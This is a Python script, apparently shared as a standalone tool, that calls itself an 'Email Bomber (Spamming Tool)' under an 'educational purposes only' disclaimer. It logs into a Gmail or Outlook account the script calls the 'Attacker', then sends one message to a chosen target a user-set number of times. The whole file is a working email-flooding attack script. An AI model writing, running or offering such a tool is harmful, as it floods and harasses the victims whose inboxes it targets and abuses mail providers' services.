#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!


import smtplib
import sys
import time

print()
print()
print('            #################################################       ')
print('            #                                               #       ')
print('            #        Email Bomber ( Spamming Tool )         #       ')
print('            #                                               #       ')
print('            #                  Version 1.0                  #       ')
print('            #                                               #       ')
print('            #           Created by : Mahek Katariya         #       ')
print('            #                                               #       ')
print('            #       Only for Educational Purposes !!        #       ')
print('            #                                               #       ')
print('            #################################################       ')
print()
print()

print('Which email service you want to use : \nPress 1 for  Gmail  Press 2 for Microsoft Outlook \n')

while True :
    choice = input('Enter Your choice : ')
    if choice == '1' :
        smtp_server = 'smtp.gmail.com'
        break
    elif choice == '2' :
        smtp_server = 'smtp-mail.outlook.com'
        break
    else :
        print('\nWrong Choise Please Enter again.\n')


port = 587
while True :
    email = input('\nAttacker Email Address : ')
    print()
    passwd = input('Password: ')
    try :
        server = smtplib.SMTP(smtp_server,port)
        server.ehlo()
        server.starttls()
        server.login(email,passwd)
        print('\nLogin Successful....')
        break
    except KeyboardInterrupt:
        print('[-] Canceled')
    except smtplib.SMTPAuthenticationError:
        print('\n[!] The username or password you entered is incorrect.')

print()

to = input('To: ')

print()

subject = input('Subject: ')

print()

body = input('Message: ')

print()

total = int(input('Number of send: '))

print()

try:
    for i in range(1, total+1):
        msg = 'From: ' + email + '\nSubject: ' + subject + '\n\n' + body
        server.sendmail(email,to,msg)
        print("\rE-mails sent: ",i)
        time.sleep(0.5)
        sys.stdout.flush()
    server.quit()
    print('\nDone !!!')
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except SMTPException:
    print("Error Occured : \nReasons - \n1.Check Your internet connection \n2.Error in sending email \n3.You didn't verify your mobile number for this email \n4.Some internal error occured please try again.")
    sys.exit()
